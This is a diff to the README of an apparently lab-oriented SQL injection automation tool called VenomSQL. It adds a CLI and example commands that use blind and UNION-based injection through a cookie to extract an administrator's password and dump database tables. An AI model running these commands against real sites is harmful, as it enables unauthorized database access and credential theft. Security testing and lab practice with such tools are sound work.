@@ -14,22 +14,27 @@ Modular SQL injection automation tool.
 - **UNION-based SQLi** — extracts data directly from response (single request per query)
 - **Auto password length detection** — detects length before brute forcing
 - **Binary search extraction** — ~7 requests per character instead of 70+ (brute force)
+- **CLI support** — runnable via `python -m VenomSQL`
 
 ## Project Structure
 
 ```
 VenomSQL/
 ├── __init__.py      # Package exports
+├── __main__.py      # CLI entry point
 ├── main.py          # BaseSQLi — base class, send(), detect_length(), build_condition_payload()
 ├── dbConfig.py      # Database-specific syntax configurations
 ├── blindError.py    # Blind SQLi (error-based) module
 ├── blindBoolean.py  # Blind SQLi (boolean-based) module
 ├── blindTime.py     # Blind SQLi (time-based) module
 ├── unionBased.py    # UNION-based SQLi module
+├── README.md        # Documentation
 └── .gitignore
 ```
 
 ## Usage
+
+### Python API
 
 ```python
 from VenomSQL import BlindErrorBased
@@ -44,8 +49,36 @@ sqli = BlindErrorBased(
     db_type="oracle",
     extra_cookies=extra_cookies
 )
+
 sqli.extract(column="password", username="administrator")
 print(sqli.found_password)
+```
+
+### CLI
+
+```bash
+python -m VenomSQL \
+  --url "https://target.com" \
+  --technique blind-boolean \
+  --db oracle \
+  --inject cookie \
+  --param TrackingId \
+  --table users \
+  --column password \
+  --username administrator \
+  --signal "Welcome back!"
+```
+
+For UNION enumeration:
+
+```bash
+python -m VenomSQL \
+  --url "https://target.com" \
+  --technique union \
+  --db mysql \
+  --inject cookie \
+  --param TrackingId \
+  --dump-tables
 ```
 
 ## Supported Databases
@@ -59,15 +92,18 @@ print(sqli.found_password)
 | SQLite | SUBSTR | \|\| | -- | - |
 | MariaDB | SUBSTRING | CONCAT | # | SLEEP |
 
-## Roadmap
+## Current Status
+
+The project is largely up to date with the current codebase:
 
 - [x] Blind SQLi (Boolean-based)
 - [x] Blind SQLi (Time-based)
+- [x] Blind SQLi (Error-based)
 - [x] Flexible injection points (cookie, URL param, POST body, header)
 - [x] DB-aware concat, comment, limit_one config
 - [x] Password length detection
 - [x] Binary search per character (~7 requests instead of 70+)
 - [x] UNION-based SQLi
+- [x] CLI interface
 - [ ] Proxy support (route through Burp)
-- [ ] CLI interface
 - [ ] Auto-detect DB type
